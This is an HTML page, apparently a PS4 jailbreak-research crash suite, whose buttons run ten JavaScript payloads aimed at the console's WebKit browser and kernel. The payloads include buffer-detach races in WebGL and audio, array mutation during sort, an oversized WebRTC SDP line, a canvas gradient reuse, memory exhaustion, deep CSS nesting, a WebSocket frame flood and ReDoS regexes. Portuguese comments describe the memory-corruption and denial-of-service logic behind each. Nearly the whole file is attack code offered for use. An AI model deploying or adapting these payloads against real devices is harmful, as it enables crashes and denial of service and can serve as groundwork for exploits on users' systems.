<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Fatal Kernel/WebKit Crash Suite v12000</title>
</head>
<body>

<h1>SUITE V12000: HARDWARE INTERRUPT & DMA CORRUPTION</h1>
<p>Status: CRITICAL. Target: DMA Race & Kernel Heap Exhaustion.</p>
<hr>

<button onclick="crashWebGLDMARace()">01. WebGL Texture Upload DMA vs Buffer Delete Race (GPU IOMMU Panic)</button>

<button onclick="crashConvolverNode()">02. Audio ConvolverNode Buffer Detach during FFT Process (DSP Panic)</button>

<button onclick="crashArraySortMutation()">03. Array.prototype.sort Unsafe Mutation (JSC Heap Corruption)</button>

<button onclick="crashSDPLineOverflow()">04. WebRTC SDP Line Parser Integer Overflow (NetStack Stack Smash)</button>

<button onclick="crashCanvasGradientUAF()">05. Canvas CreateLinearGradient Use-After-Free (Render Engine Crash)</button>

<button onclick="crashFileReaderSyncBomb()">06. FileReaderSync Massive Blob Allocation (Kernel OOM Panic)</button>

<button onclick="crashCSSCounterRecursion()">07. CSS Counters Recursive Increment (Layout Stack Overflow)</button>

<button onclick="crashWebSocketFragmentation()">08. WebSocket 0-Byte Fragment Flood (Network Buffer Exhaustion)</button>

<button onclick="crashNodeRemovalRecursion()">09. DOMNodeRemoved Recursive Tree Destruction (UAF)</button>

<button onclick="crashRegExpBacktrack()">10. RegExp Catastrophic Backtracking (Thread Hang/Crash)</button>

<div id="log"></div>

<script>
    function log(msg) {
        document.getElementById('log').innerText += "\n" + msg;
    }

    // 01. WebGL Texture DMA Race
    // Alvo: sceGnmDriver (GPU Direct Memory Access)
    // Lógica: Iniciar um upload de textura (que usa DMA assíncrono).
    // Deletar o buffer de origem IMEDIATAMENTE.
    // O hardware tenta ler RAM que foi marcada como livre.
    function crashWebGLDMARace() {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        if(!gl) return log("WebGL off");

        const tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);

        // Cria um buffer PBO (Pixel Buffer Object) simulado via ArrayBuffer
        const size = 2048 * 2048 * 4; // 16MB texture
        const buf = new Uint8Array(size).fill(0xAA);
        
        // Worker para detachar a memória
        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));

        // Race condition apertada
        setTimeout(() => {
            // Tenta enviar para a GPU
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, buf);
            // Força flush do comando para o driver
            gl.flush();
        }, 0);

        setTimeout(() => {
            // Remove a memória debaixo dos pés do driver
            w.postMessage(buf.buffer, [buf.buffer]);
            // Tenta deletar a textura também
            gl.deleteTexture(tex);
        }, 0);
    }

    // 02. Audio ConvolverNode Buffer Detach
    // Alvo: Audio DSP (Digital Signal Processor)
    // Lógica: ConvolverNode faz FFT (Transformada Rápida de Fourier) complexa.
    // Se removermos o buffer de áudio durante o processamento matemático, o DSP acessa lixo.
    function crashConvolverNode() {
        if(!window.AudioContext) return;
        const ctx = new AudioContext();
        const conv = ctx.createConvolver();
        const osc = ctx.createOscillator();
        
        // Buffer grande para garantir tempo de processamento
        const len = ctx.sampleRate * 2;
        const buffer = ctx.createBuffer(2, len, ctx.sampleRate);
        // Preenche com ruído
        for(let i=0; i<len; i++) buffer.getChannelData(0)[i] = Math.random();

        conv.buffer = buffer;
        osc.connect(conv);
        conv.connect(ctx.destination);
        
        // Pega o array buffer cru
        const ab = buffer.getChannelData(0).buffer;
        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));

        osc.start();
        
        // O GOLPE: Detach durante a convolução ativa
        setTimeout(() => {
            w.postMessage(ab, [ab]);
            // Tenta trocar o buffer para null simultaneamente
            try { conv.buffer = null; } catch(e){}
        }, 10);
    }

    // 03. Array.prototype.sort Unsafe Mutation
    // Alvo: JSC Array Storage
    // Lógica: O algoritmo de sort do JSC não espera que o array mude de tamanho durante a comparação.
    // Se mudarmos o tamanho, os índices internos do algoritmo apontam para fora da memória alocada.
    function crashArraySortMutation() {
        const arr = [];
        for(let i=0; i<1000; i++) arr.push(i);

        // Comparator malicioso
        arr.sort((a, b) => {
            if (a === 50) {
                // Destroi o array no meio do sort
                arr.length = 0;
                // Enche o heap com lixo para ocupar o espaço
                const junk = [];
                for(let k=0; k<1000; k++) junk.push(1.1);
            }
            return a - b;
        });
    }

    // 04. WebRTC SDP Line Parser Integer Overflow
    // Alvo: NetStack SDP Parser
    // Lógica: Criar uma linha SDP que excede o buffer de leitura de linha (geralmente 1024 ou 4096 bytes).
    function crashSDPLineOverflow() {
        if (!window.RTCPeerConnection) return;
        const pc = new RTCPeerConnection();
        
        // Header válido
        let sdp = "v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n";
        sdp += "m=audio 1234 RTP/AVP 0\r\n";
        
        // Linha de atributo maliciosa: a=fmtp:... sem quebra de linha por 100KB
        // Isso força overflow no buffer de stack do parser C
        let overflow = "a=fmtp:0 ";
        for(let i=0; i<100000; i++) overflow += "A"; 
        sdp += overflow + "\r\n";

        const desc = { type: 'offer', sdp: sdp };
        pc.setRemoteDescription(desc).catch(e=>{});
    }

    // 05. Canvas CreateLinearGradient Use-After-Free
    // Alvo: WebCore Render Object
    function crashCanvasGradientUAF() {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        let grad = ctx.createLinearGradient(0,0,100,100);
        
        // Adiciona referências
        ctx.fillStyle = grad;
        
        // Tenta destruir o objeto gradiente (em JS não tem free explícito, 
        // mas tentamos invalidar via reset de contexto)
        c.width = 0; // Reseta o contexto
        c.width = 100;
        
        // O estilo ainda aponta para o gradiente antigo?
        // Em alguns builds do WebKit, isso deixa um ponteiro pendurado
        ctx.fillRect(0,0,100,100); 
        
        // Adiciona stops no gradiente "morto" se a referência JS persistiu
        try {
            grad.addColorStop(0.5, 'red');
        } catch(e) {}
    }

    // 06. FileReaderSync Massive Blob Allocation
    // Alvo: Kernel Virtual Memory (Swap/OOM)
    function crashFileReaderSyncBomb() {
        // Tenta criar um Blob maior que a RAM física disponível para o navegador
        // PS4 tem limite restrito (~1-2GB para app).
        const chunks = [];
        try {
            for(let i=0; i<100; i++) {
                chunks.push(new Uint8Array(1024 * 1024 * 10)); // 10MB chunks
            }
        } catch(e) {}
        
        const blob = new Blob(chunks);
        
        // Worker síncrono para travar a thread e forçar leitura
        const w = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function(e) {
                const fr = new FileReaderSync();
                // Tenta ler tudo para a memória de uma vez
                // Isso deve disparar o OOM Killer do Kernel ou Panic
                fr.readAsArrayBuffer(e.data);
            }
        `], {type:'text/javascript'})));
        
        w.postMessage(blob);
    }

    // 07. CSS Counter Recursion
    // Alvo: CSS Layout Engine (CalcStack)
    function crashCSSCounterRecursion() {
        const style = document.createElement('style');
        // Define contadores aninhados recursivamente
        style.textContent = `
            div { counter-increment: c 1; }
            div::before { content: counter(c); }
        `;
        document.head.appendChild(style);
        
        const root = document.createElement('div');
        let curr = root;
        // Profundidade insana de aninhamento DOM + Contadores CSS
        for(let i=0; i<10000; i++) {
            const el = document.createElement('div');
            curr.appendChild(el);
            curr = el;
        }
        
        document.body.appendChild(root);
        // Força reflow (cálculo de layout)
        root.offsetHeight; 
    }

    // 08. WebSocket 0-Byte Fragment Flood
    // Alvo: Network Buffer Management (Mbufs)
    function crashWebSocketFragmentation() {
        const ws = new WebSocket("wss://echo.websocket.org");
        ws.onopen = () => {
            // Envia milhares de frames de 0 bytes ou 1 byte
            // Cada frame consome um header e uma estrutura de alocação no kernel
            // Isso fragmenta o heap de rede (mbuf clusters)
            const buf = new Uint8Array(1);
            setInterval(() => {
                for(let i=0; i<1000; i++) {
                    if(ws.readyState === 1) ws.send(buf);
                }
            }, 10);
        };
    }

    // 09. DOMNodeRemoved Recursive Tree Destruction
    // Alvo: WebCore Tree Mutator
    function crashNodeRemovalRecursion() {
        const root = document.createElement('div');
        const child = document.createElement('div');
        root.appendChild(child);
        document.body.appendChild(root);

        root.addEventListener('DOMNodeRemoved', function(e) {
            // Quando removemos algo, adicionamos algo novo que dispara remoção antiga?
            // Tenta criar um ciclo de eventos de mutação
            const n = document.createElement('div');
            try {
                document.body.appendChild(n);
                document.body.removeChild(n); // Recursão indireta
            } catch(e) {}
        });

        document.body.removeChild(root);
    }

    // 10. RegExp Catastrophic Backtracking
    // Alvo: Main Thread Watchdog / Kernel Scheduler
    function crashRegExpBacktrack() {
        // Expressão clássica de ReDoS (Regular Expression Denial of Service)
        // (x+x+)+y
        const re = /([a-zA-Z]+)*$/;
        
        // String longa que quase casa, mas falha no final
        const str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"; 
        
        // Em WebKit antigo, isso roda na Main Thread e trava a UI
        // Se consumir muita CPU sem ceder, o Kernel watchdog pode matar o processo
        re.test(str);
        
        // Versão mais agressiva para estourar buffer interno
        const re2 = /(x+x+)+y/;
        const str2 = "x".repeat(5000);
        re2.test(str2);
    }
</script>

</body>
</html>
